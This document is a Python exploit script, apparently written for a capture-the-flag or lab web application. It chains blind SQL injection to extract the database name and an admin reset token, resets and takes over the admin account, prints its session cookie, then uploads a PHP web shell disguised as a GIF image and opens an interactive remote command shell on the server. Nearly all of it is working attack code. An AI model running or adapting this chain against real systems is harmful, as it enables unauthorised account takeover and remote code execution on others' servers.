import requests, sys, time
from cmd import Cmd

# proxies = {
# 	"http": "http://127.0.0.1:8080",
# 	"https": "https://127.0.0.1:8080",}

ip = sys.argv[1]

def website(param):
	url = ip+"/item/viewItem.php"
	s = requests.Session()
	x = s.get(url, params=param, allow_redirects=False)
	if x.status_code == 404:
		return True

def main():
	print("\n"+"\t" + " [*] By SILVER [*]\n")
	print("Target URL -----> " + ip[7:] )

	#1 Create token

	s = requests.Session()
	url = ip+"/login/resetPassword.php"
	data = {"username": "admin"}
	x = s.post(url, data=data, allow_redirects=False)
	secret = ""
	final = ""	
	print("\n"+"[*] Extracting Database Name : ")
	while True:

		#1 Database Name : 

		for digit in range(1,10):
			for char in range(1, 150):
				param = {"id": "1 and ascii(substr(database()," + str(digit) + ",1)) = " + str(char) + " -- -" }
				if website(param):
					sys.stdout.write(str(chr(char)))
					sys.stdout.flush()
					final = final + str(chr(char))
		print("\n"+"\n"+"[+] Database Name : " + final)

		#2 Extract Admin Token : 

		print("\n"+"[+] Exploiting Blind SQLi and Extracting Admin Token :" + " [+]")
		token = ""
		for digit in range(1,17):
			for char in range(1, 150):
				param = {"id": "1 and ascii(substr((select token from user where id = 1)," + str(digit) + ",1)) = " + str(char) + " -- -" }
				if website(param):
					sys.stdout.write(str(chr(char)))
					sys.stdout.flush()
					token = token + str(chr(char))
					#print(final)
		print("\n"+"\n"+"[*] Admin Token : " + token)	

		#3 Reset Password : 

		url = ip+"/login/doResetPassword.php"
		param = {"token": token }
		x = s.get(url, params=param, allow_redirects=False)
		print("\n"+"[*] Reset Admin Password Done  =) ")

		#4 Change Password : 

		url = ip+"/login/doChangePassword.php"
		data = {"token": token, "password":"admin1"}
		x = s.post(url, data=data, allow_redirects=False)
		print("\n[+] Successfully changing Admin password ! [+]")

		#5 Log in to admin account : 

		url = ip+"/login/checkLogin.php"
		data = {"username": "admin", "password":"admin1"}
		x = s.post(url, data=data, allow_redirects=True)
		print("\n[*] Admin Cookie: " + str(s.cookies['PHPSESSID']) )
		if "FLAG1" in x.text:
			print("\n[+] Successfully Login to Admin account [+]")
		else:
			print("[-] Fail to Login to Admin account [-]")
			
		#6 Uplaod Shell : 

		url = ip+"/item/newItem.php"
		files = {'id_user': (None, '1'), 'name': (None, 'Silver'), 'image': ('rce.phar', 'GIF89a; <?php system($_GET["Silver"]); ?>', 'image/png'), 'description': (None, 'Silver'), 'price': (None, '1')}
		x = s.post(url, files=files ,cookies=s.cookies, allow_redirects=True)

		print("\n[*] Uploading Shell Done! [*]" + "\n")
		time.sleep(1)
		print("\n[*] Interactive shell ... " + "\n")

		#6 RCE : 

		class Term(Cmd):
		    prompt = "$iLvEr > "
		    def default(self, args):
		        resp = requests.get(ip+'/item/image/rce.phar',
		                params = {"Silver": args})
		        print(resp.text[8:])
		        if args ==  "exit":
		        	print("\t" + " [*] Done =) [*]\n")
		        	exit()

		term = Term()
		term.cmdloop()
		
if __name__ == '__main__':
	if len(sys.argv) < 1:
	    print("(+) Usage: %s <Target ip> ") % sys.argv[0]
	    print("(+) eg: %s 192.168.1.6 ") % sys.argv[0]
	    exit()  
	else:
		main()
		#By SILVER
